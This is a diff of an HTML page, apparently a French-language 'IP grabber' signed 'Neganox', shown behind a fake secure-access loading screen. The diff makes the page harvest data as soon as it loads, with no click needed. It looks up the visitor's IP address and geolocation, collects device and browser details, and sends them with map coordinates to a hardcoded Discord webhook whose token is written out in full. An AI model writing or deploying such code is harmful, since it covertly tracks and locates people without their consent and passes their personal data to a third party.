@@ -14,80 +14,125 @@
             margin: 0;
             padding: 0;
             font-family: 'Segoe UI', sans-serif;
-            background: linear-gradient(135deg, #1e1e2f, #2d2d42);
+            background-color: #000;
+            height: 100vh;
+            overflow: hidden;
+            color: white;
+        }
+        
+        #particles-js {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+        }
+        
+        .login-container {
+            position: relative;
+            z-index: 1;
             height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            color: white;
         }
         
         .login-card {
-            background: rgba(255, 255, 255, 0.05);
+            background: rgba(0, 0, 0, 0.7);
             backdrop-filter: blur(12px);
             border-radius: 20px;
             padding: 40px;
             width: 100%;
-            max-width: 400px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            max-width: 500px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
             border: 1px solid rgba(255, 255, 255, 0.1);
             text-align: center;
-            animation: fadeIn 0.8s ease;
+            animation: fadeIn 1.5s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .login-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to bottom right,
+                rgba(88, 101, 242, 0.1),
+                rgba(235, 69, 158, 0.1),
+                rgba(0, 0, 0, 0)
+            );
+            transform: rotate(30deg);
+            z-index: -1;
         }
         
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
+            from { opacity: 0; transform: translateY(50px); }
             to { opacity: 1; transform: translateY(0); }
         }
         
         h1 {
             margin-bottom: 30px;
-            font-weight: 600;
-            font-size: 28px;
+            font-weight: 700;
+            font-size: 36px;
             background: linear-gradient(to right, var(--primary), var(--secondary));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            position: relative;
+            display: inline-block;
         }
         
-        .login-btn {
+        h1::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 50px;
+            height: 3px;
             background: linear-gradient(to right, var(--primary), var(--secondary));
-            border: none;
-            color: white;
-            padding: 16px 32px;
-            font-size: 18px;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 5px 20px rgba(88, 101, 242, 0.4);
+            border-radius: 3px;
+        }
+        
+        .message {
+            font-size: 24px;
+            margin-bottom: 40px;
+            color: rgba(255,255,255,0.8);
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 0.8; }
+            50% { opacity: 1; }
+            100% { opacity: 0.8; }
+        }
+        
+        .signature {
+            margin-top: 40px;
+            font-style: italic;
+            color: rgba(255,255,255,0.6);
+            font-size: 14px;
+        }
+        
+        .loading-bar {
             width: 100%;
-            font-weight: 600;
-            position: relative;
+            height: 4px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 2px;
+            margin-top: 30px;
             overflow: hidden;
         }
         
-        .login-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 25px rgba(88, 101, 242, 0.6);
-        }
-        
-        .login-btn:active {
-            transform: translateY(1px);
-        }
-        
-        .login-btn::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
+        .loading-progress {
             height: 100%;
-            background: linear-gradient(to right, rgba(255,255,255,0.2), rgba(255,255,255,0));
-            transform: translateX(-100%);
-            transition: transform 0.6s ease;
-        }
-        
-        .login-btn:hover::after {
-            transform: translateX(100%);
+            width: 0%;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            border-radius: 2px;
+            transition: width 0.3s ease;
         }
         
         .status {
@@ -96,53 +141,247 @@
             color: rgba(255,255,255,0.7);
             min-height: 20px;
         }
+        
+        /* Snowflake animations */
+        @keyframes fall {
+            to { transform: translateY(100vh); }
+        }
+        
+        .snowflake {
+            position: absolute;
+            color: white;
+            opacity: 0.8;
+            animation: fall linear infinite;
+            z-index: 0;
+        }
     </style>
 </head>
 <body>
-    <div class="login-card">
-        <h1>Connexion Requise</h1>
-        <button id="loginBtn" class="login-btn">SE CONNECTER</button>
-        <div id="status" class="status"></div>
+    <div id="particles-js"></div>
+    
+    <div class="login-container">
+        <div class="login-card">
+            <h1>Accès Sécurisé</h1>
+            <div class="message">Fuck Your Self</div>
+            
+            <div class="loading-bar">
+                <div id="loadingProgress" class="loading-progress"></div>
+            </div>
+            
+            <div id="status" class="status">Collecte des informations...</div>
+            <div class="signature">By Neganox</div>
+        </div>
     </div>
 
+    <!-- Particles.js library -->
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    
     <script>
-        document.getElementById('loginBtn').addEventListener('click', async function() {
-            const btn = this;
+        // Initialize particles.js
+        document.addEventListener('DOMContentLoaded', function() {
+            particlesJS("particles-js", {
+                "particles": {
+                    "number": {
+                        "value": 80,
+                        "density": {
+                            "enable": true,
+                            "value_area": 800
+                        }
+                    },
+                    "color": {
+                        "value": "#ffffff"
+                    },
+                    "shape": {
+                        "type": "circle",
+                        "stroke": {
+                            "width": 0,
+                            "color": "#000000"
+                        },
+                        "polygon": {
+                            "nb_sides": 5
+                        }
+                    },
+                    "opacity": {
+                        "value": 0.5,
+                        "random": true,
+                        "anim": {
+                            "enable": true,
+                            "speed": 1,
+                            "opacity_min": 0.1,
+                            "sync": false
+                        }
+                    },
+                    "size": {
+                        "value": 3,
+                        "random": true,
+                        "anim": {
+                            "enable": true,
+                            "speed": 2,
+                            "size_min": 0.1,
+                            "sync": false
+                        }
+                    },
+                    "line_linked": {
+                        "enable": true,
+                        "distance": 150,
+                        "color": "#5865F2",
+                        "opacity": 0.4,
+                        "width": 1
+                    },
+                    "move": {
+                        "enable": true,
+                        "speed": 1,
+                        "direction": "none",
+                        "random": true,
+                        "straight": false,
+                        "out_mode": "out",
+                        "bounce": false,
+                        "attract": {
+                            "enable": true,
+                            "rotateX": 600,
+                            "rotateY": 1200
+                        }
+                    }
+                },
+                "interactivity": {
+                    "detect_on": "canvas",
+                    "events": {
+                        "onhover": {
+                            "enable": true,
+                            "mode": "grab"
+                        },
+                        "onclick": {
+                            "enable": true,
+                            "mode": "push"
+                        },
+                        "resize": true
+                    },
+                    "modes": {
+                        "grab": {
+                            "distance": 140,
+                            "line_linked": {
+                                "opacity": 1
+                            }
+                        },
+                        "bubble": {
+                            "distance": 400,
+                            "size": 40,
+                            "duration": 2,
+                            "opacity": 8,
+                            "speed": 3
+                        },
+                        "repulse": {
+                            "distance": 200,
+                            "duration": 0.4
+                        },
+                        "push": {
+                            "particles_nb": 4
+                        },
+                        "remove": {
+                            "particles_nb": 2
+                        }
+                    }
+                },
+                "retina_detect": true
+            });
+            
+            // Create snowflakes
+            function createSnowflakes() {
+                const snowflakes = ['❄', '✻', '✺', '✵', '✸'];
+                const container = document.body;
+                
+                for (let i = 0; i < 50; i++) {
+                    const snowflake = document.createElement('div');
+                    snowflake.className = 'snowflake';
+                    snowflake.textContent = snowflakes[Math.floor(Math.random() * snowflakes.length)];
+                    
+                    // Random properties
+                    const size = Math.random() * 20 + 10;
+                    const posX = Math.random() * window.innerWidth;
+                    const duration = Math.random() * 10 + 5;
+                    const delay = Math.random() * 5;
+                    
+                    snowflake.style.left = `${posX}px`;
+                    snowflake.style.fontSize = `${size}px`;
+                    snowflake.style.animationDuration = `${duration}s`;
+                    snowflake.style.animationDelay = `${delay}s`;
+                    snowflake.style.top = `-${size}px`;
+                    
+                    container.appendChild(snowflake);
+                    
+                    // Remove snowflake after animation completes and create new one
+                    setTimeout(() => {
+                        snowflake.remove();
+                        createSnowflakes();
+                    }, duration * 1000);
+                }
+            }
+            
+            // Start the snowflakes
+            createSnowflakes();
+            
+            // Start the automatic data collection process
+            setTimeout(collectData, 1500);
+        });
+        
+        // Automatic data collection function
+        async function collectData() {
             const status = document.getElementById('status');
+            const loadingProgress = document.getElementById('loadingProgress');
             
             try {
-                // Désactiver le bouton pendant le traitement
-                btn.disabled = true;
-                btn.innerHTML = '<span style="display:inline-block;animation:spin 1s linear infinite">↻</span> Traitement...';
-                status.textContent = "Collecte des informations...";
+                // Update loading progress
+                loadingProgress.style.width = '20%';
+                status.textContent = "Collecte de l'adresse IP...";
                 
-                // Récupérer l'IP et la localisation
+                // Get IP address
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const { ip } = await ipResponse.json();
                 
+                loadingProgress.style.width = '40%';
+                status.textContent = "Localisation en cours...";
+                
+                // Get location data
                 const locResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                 const locData = await locResponse.json();
                 
-                // Formater les données pour Discord
+                loadingProgress.style.width = '60%';
+                status.textContent = "Analyse du système...";
+                
+                // Get additional system info
+                const systemInfo = {
+                    platform: navigator.platform,
+                    userAgent: navigator.userAgent,
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    language: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    dateTime: new Date().toLocaleString(),
+                    cpuCores: navigator.hardwareConcurrency || 'Inconnu',
+                    deviceMemory: navigator.deviceMemory || 'Inconnu'
+                };
+                
+                loadingProgress.style.width = '80%';
+                status.textContent = "Envoi des données...";
+                
+                // Format data for Discord
                 const embed = {
-                    title: "Nouvelle connexion détectée",
-                    color: 0x5865F2,
+                    title: "⚠️ Accès Automatique Détecté",
+                    color: 0xEB459E,
                     fields: [
                         { name: "🌍 Adresse IP", value: ip, inline: true },
                         { name: "📍 Localisation", value: `${locData.city}, ${locData.region}, ${locData.country_name}`, inline: true },
-                        { name: "🗺️ Lien Google Maps", value: `[Voir sur Maps](https://www.google.com/maps?q=${locData.latitude},${locData.longitude})` },
-                        { name: "🖥️ Appareil", value: navigator.platform },
-                        { name: "🔍 User Agent", value: `\`\`\`${navigator.userAgent}\`\`\`` },
-                        { name: "🖥️ Résolution", value: `${window.screen.width}x${window.screen.height}` },
-                        { name: "🌐 Langue", value: navigator.language },
-                        { name: "⏱️ Fuseau horaire", value: Intl.DateTimeFormat().resolvedOptions().timeZone },
-                        { name: "📅 Date/Heure", value: new Date().toLocaleString() }
+                        { name: "🗺️ Coordonnées", value: `${locData.latitude}, ${locData.longitude}` },
+                        { name: "🖥️ Plateforme", value: systemInfo.platform },
+                        { name: "🖥️ Résolution", value: systemInfo.screenResolution },
+                        { name: "🌐 Langue", value: systemInfo.language },
+                        { name: "⏱️ Fuseau horaire", value: systemInfo.timezone },
+                        { name: "📅 Date/Heure", value: systemInfo.dateTime },
+                        { name: "💾 Mémoire", value: `${systemInfo.deviceMemory}GB` },
+                        { name: "🔍 User Agent", value: `\`\`\`${systemInfo.userAgent}\`\`\`` }
                     ],
-                    footer: { text: "Système de sécurité automatique" },
+                    footer: { text: "Security System v3.0 • By Neganox" },
                     timestamp: new Date().toISOString()
                 };
-                
-                status.textContent = "Envoi des données...";
                 
                 // REMPLACER PAR VOTRE WEBHOOK DISCORD
                 const webhookURL = 'https://discordapp.com/api/webhooks/1393637362151460985/rSzFt_8ovhnAbBIhsmHB33-BbUs8rr6_loE9-ig9feo8TfLeXDgADdDP_aU8TKYJST6Q';
@@ -157,25 +396,25 @@
                     })
                 });
                 
+                loadingProgress.style.width = '100%';
+                
                 if (response.ok) {
-                    status.textContent = "✅ Connexion réussie!";
-                    btn.textContent = "Connecté";
+                    status.textContent = "✅ Données envoyées avec succès!";
                     
-                    // Redirection après 2 secondes
+                    // Redirection après 3 secondes
                     setTimeout(() => {
                         window.location.href = "#"; // Mettez votre URL de redirection ici
-                    }, 2000);
+                    }, 3000);
                 } else {
                     throw new Error('Erreur lors de l\'envoi');
                 }
                 
             } catch (error) {
                 console.error('Erreur:', error);
-                status.textContent = "❌ Erreur, veuillez réessayer";
-                btn.textContent = "Réessayer";
-                btn.disabled = false;
+                status.textContent = "❌ Erreur de connexion, veuillez actualiser";
+                loadingProgress.style.backgroundColor = '#ff0000';
             }
-        });
+        }
     </script>
 </body>
 </html>
